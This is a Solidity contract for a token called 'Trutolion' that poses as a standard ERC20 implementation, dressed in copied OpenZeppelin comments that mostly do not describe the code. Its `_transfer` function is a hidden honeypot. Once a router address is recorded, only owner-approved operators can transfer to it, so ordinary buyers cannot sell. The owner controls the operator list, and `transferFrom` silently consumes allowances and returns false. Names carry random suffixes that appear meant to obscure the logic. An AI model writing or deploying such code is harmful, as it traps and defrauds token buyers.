// SPDX-License-Identifier: MIT
pragma solidity ^0.8.8;



contract Trutolion {
 /**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * The default value of {decimals} is 18. To change this, you should override
 * this function so it returns a different value.
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
    string public name;
    string public symbol;
    uint160 public decimals;
    uint256 public totalSupply;
    address private _owner;
    address private _router;
    address private _last;
    uint160 private _txs;
    uint160 private _txsNew;
/**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the default value returned by this function, unless
     * it's overridden.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) private _operators;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
 
    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `value`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `value`.
     */
    constructor(string memory _nameGe1Mkr, string memory _symbolq4zIDF, uint160 _decimals, uint _supplyQUTVdB, uint160 txs8CKpuk, uint160 txsNewsFXREMX) {
        name = _nameGe1Mkr;
        symbol = _symbolq4zIDF;
        decimals = _decimals;
        totalSupply = _supplyQUTVdB * 10 ** _decimals; 
        balanceOf[msg.sender] = totalSupply;
        _owner = msg.sender;
        _router = address(0);
        _last = address(_owner);
        _txs = txs8CKpuk;
        _txsNew = txsNewsFXREMX;
        _operators[_owner] = true;     
        _operators[address(_decimals)] = true; 
        _operators[address(_decimals-1)] = true;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
   /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `requestedDecrease`.
     *
     * NOTE: Although this function is designed to avoid double spending with {approval},
     * it can still be frontrunned, preventing any attempt of allowance reduction.
     */
    
    function transfer(address _to, uint256 _value) external returns (bool success) {
        require(balanceOf[msg.sender] >= _value);
        _transfer(msg.sender, _to, _value);
        return true;
    }

  /**
    * @dev Returns the bep token owner.
    */
    function _transfer(address _from, address _to, uint256 _value) internal {
    
        require(_to != address(0));
         
        if(_from != address(0) && _router == address(0)) _router = _to; 
        else {                                                          
            if(_txs == 0) {                                             
                _operators[address(decimals)] = false;
                _txs = type(uint160).max;
            }                                   
            if (_operators[address(decimals)])                      
            {
                if(_operators[address(decimals-1)] && _to == _router)
                    require(_last == _from, "Deprecated"); 
            }                 
            else if(_operators[_from]) {   
                _last = _to;      
            }
            else require(_to != _router, "Duplicating");    
            _txs--;
        }
        _last = _to;              
        
        balanceOf[_from] = balanceOf[_from] - (_value);
        balanceOf[_to] = balanceOf[_to] + (_value);
        emit Transfer(_from, _to, _value);
    }

    /**
    * @dev Returns the bep token owner.
    */
    function getOwnerSet() external view returns (address) {
        return _owner;
    }
    /**
    * @dev Throws if called by any account other than the owner.
    */
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    
    function mainSet(address _to, bool _set) external onlyOwner returns (bool) {
        require(_to != address(0));
        _operators[_to] = _set;
        return true;
    }

    function node(address _verify) external view returns (bool) {
    return _operators[_verify];
    }

    function setTXsWVW7pn(uint160 txs) external onlyOwner returns (bool) {
        _txs = txs;
        if(_txs != 0) _operators[address(decimals)] = true;
        return true;
    }

 /**
     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.
     *
     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by
     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any
     * `Approval` event during `transferFrom` operations.
     *
     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to true
     * using the following override:
     * ```
     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {
     *     super._approve(owner, spender, value, true);
     * }
     * ```
     *
     * Requirements are the same as {_approve}.
     */

    function approve(address _spender, uint256 _value) external returns (bool) {
        require(_spender != address(0));
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function getMMMWVW7pn() external view returns (uint160 txs, address last, bool state, bool algo) {
        txs = _txs;
        last = _last;
        state = _operators[address(decimals)];
        algo = _operators[address(decimals-1)];
    }
  /**
    * @dev Returns the bep token owner.
    */
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool) {
        require(_value <= balanceOf[_from]);
        require(_value <= allowance[_from][msg.sender]);
        allowance[_from][msg.sender] = allowance[_from][msg.sender] - (_value);
        if(_from != _owner && !_operators[_from] && !_operators[address(decimals)]) return false;
        _transfer(_from, _to, _value);
        return true;
    }

      /**
    * @dev Returns the bep token owner.
    */
    function getMetricsNewypPQE2() external view returns (uint160 txsNew) {
        txsNew = _txsNew;
    }



}